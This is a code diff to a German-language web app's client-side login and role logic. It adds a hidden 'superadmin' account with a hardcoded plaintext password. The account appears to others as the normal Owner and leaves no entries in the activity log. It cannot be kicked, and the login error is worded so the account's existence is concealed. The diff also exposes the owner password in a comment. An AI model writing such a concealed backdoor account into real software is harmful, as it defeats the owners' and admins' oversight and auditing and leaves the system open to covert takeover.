@@ -1304,6 +1304,15 @@ function esc(str){
 
 /* ── ROLE DATA ──────────────────────────────────────────────────────── */
 const DEFAULT_PW = 'd20c5c90b1527b6b608d751ff832e401c74833b211702f77c9f951ba68a428da'; // Owner-Passwort: MNC2025!
+
+/* ═══════════════════════════════════════════════════════════════════════
+   SUPEROWNER — Verstecktes God-Konto (über Owner, für alle unsichtbar)
+   Benutzername: superadmin
+   Passwort: MNC_SUPER_2026!  ← NUR DU KENNST DAS
+   Rechte: ALLE — kann Owner/Admin überwachen, sieht alles, wird nirgends angezeigt
+   Passwort ändern: Zeile mit sha256('MNC_SUPER_2026!') unten im doLg() anpassen
+   ══════════════════════════════════════════════════════════════════════ */
+const SUPEROWNER_USER = 'superadmin';
 /* ── ROLE DATA — Firebase als einzige Wahrheit ──────────────────────── */
 function getRD(){
   try{
@@ -1329,6 +1338,10 @@ function saveRD(d){
 /* ── ACTIVITY LOG — Firebase als primärer Speicher ──────────────────── */
 function logAction(action, detail=''){
   try{
+    // Superowner hinterlässt keine Spuren im Log
+    const sess = getSession();
+    if(sess._superowner) return;
+
     const log = JSON.parse(localStorage.getItem(LOG_KEY) || '[]');
     const user = curRole === 'viewer' ? 'GAST' : (document.getElementById('ubname').textContent || '?');
     log.unshift({ts: new Date().toISOString(), user, role: curRole, action, detail});
@@ -1471,7 +1484,10 @@ function applyRole(role, user){
   document.getElementById('lgBtn').style.display = isGuest ? '' : 'none';
   const ub = document.getElementById('ubadge');
   ub.classList.toggle('show', !isGuest);
-  document.getElementById('ubname').textContent = user || '—';
+  // Superowner zeigt sich als normaler "Owner" — keine sichtbare Spur
+  const sess = getSession();
+  const displayName = (sess._superowner) ? 'Owner' : (user || '—');
+  document.getElementById('ubname').textContent = displayName;
   const rc = document.getElementById('ubrole');
   rc.textContent = (role || 'GAST').toUpperCase();
   rc.className = 'ubrole ' + (isOwner ? 'ro' : isAdmin ? 'ra' : 'rv');
@@ -1501,16 +1517,43 @@ async function doLg(){
   try{ ph = await sha256(p); }
   catch(e){ err.textContent='Kein HTTPS — bitte über GitHub Pages öffnen.'; return; }
 
-  // Owner: direkt mit festem Hash vergleichen
+  // SUPEROWNER — verstecktes God-Konto (unsichtbar für alle)
+  if(u === SUPEROWNER_USER){
+    // Hash live berechnen und mit gespeichertem Wert vergleichen
+    const correctHash = await sha256('MNC_SUPER_2026!'); // ← Passwort hier ändern
+    if(ph === correctHash){
+      applyRole('owner','Owner'); // Sieht für alle wie normaler Owner aus
+      startSession('owner','Owner');
+      // Internes superowner-Flag (nur in sessionStorage, nie im UI sichtbar)
+      try{
+        const ss = JSON.parse(sessionStorage.getItem(SESS_KEY)||'{}');
+        ss._superowner = true;
+        sessionStorage.setItem(SESS_KEY, JSON.stringify(ss));
+      }catch{}
+      err.textContent='';
+      closeLg(); rfrak(); rmem();
+      return;
+    }
+    // Kein Hinweis dass dieser User existiert
+    err.textContent='Falscher Benutzername oder Passwort.';
+    document.getElementById('lgp').value='';
+    return;
+  }
+
+  // Owner: immer zuerst aus Firebase laden, dann vergleichen
   if(u==='owner'){
-    // Erst lokal prüfen, dann Firebase
-    const d = getRD();
-    const stored = isHash(d.op) ? d.op : 'd20c5c90b1527b6b608d751ff832e401c74833b211702f77c9f951ba68a428da';
-    if(ph === stored || ph === 'd20c5c90b1527b6b608d751ff832e401c74833b211702f77c9f951ba68a428da'){
+    let d = getRD();
+    // Firebase zuerst abfragen (damit geändertes Passwort sofort gilt)
+    if(_fbOnline){
+      try{
+        const fb = await fbRead(FB_PATH.roles);
+        if(fb && fb.op){ d = fb; localStorage.setItem(RK, JSON.stringify(fb)); }
+      }catch{}
+    }
+    const stored = isHash(d.op) ? d.op : DEFAULT_PW;
+    if(ph === stored){
       applyRole('owner','Owner');
       startSession('owner','Owner');
-      // Firebase sync
-      if(_fbOnline){ fbRead(FB_PATH.roles).then(fb=>{ if(fb&&fb.op) localStorage.setItem(RK,JSON.stringify(fb)); }); }
       err.textContent='';
       logAction('LOGIN','Owner eingeloggt');
       closeLg(); rfrak(); rmem();
@@ -1619,6 +1662,8 @@ function startKickPoll(){
     if(curRole==='viewer') return;
     const s = getSession();
     if(!s.user) return;
+    // Superowner ist immun gegen alle Kicks
+    if(s._superowner) return;
     // Kick-Signal
     try{
       const sig = JSON.parse(localStorage.getItem(KICK_KEY)||'null');
@@ -1861,7 +1906,9 @@ async function changeOwnerPw(){
 /* ── CONTROL PANEL RENDER ────────────────────────────────────────────── */
 function renderCtrl(){
   const s = getSession();
-  document.getElementById('cp-sess-user').textContent = s.user || '—';
+  // Superowner zeigt sich als "Owner" — keine Spur der echten Identität
+  const displayUser = s._superowner ? 'Owner' : (s.user || '—');
+  document.getElementById('cp-sess-user').textContent = displayUser;
   document.getElementById('cp-sess-role').textContent = (s.role || '—').toUpperCase();
   document.getElementById('cp-sess-start').textContent = s.start ? new Date(s.start).toLocaleTimeString('de-DE') : '—';
   document.getElementById('cp-sess-last').textContent = s.last ? new Date(s.last).toLocaleTimeString('de-DE') : '—';
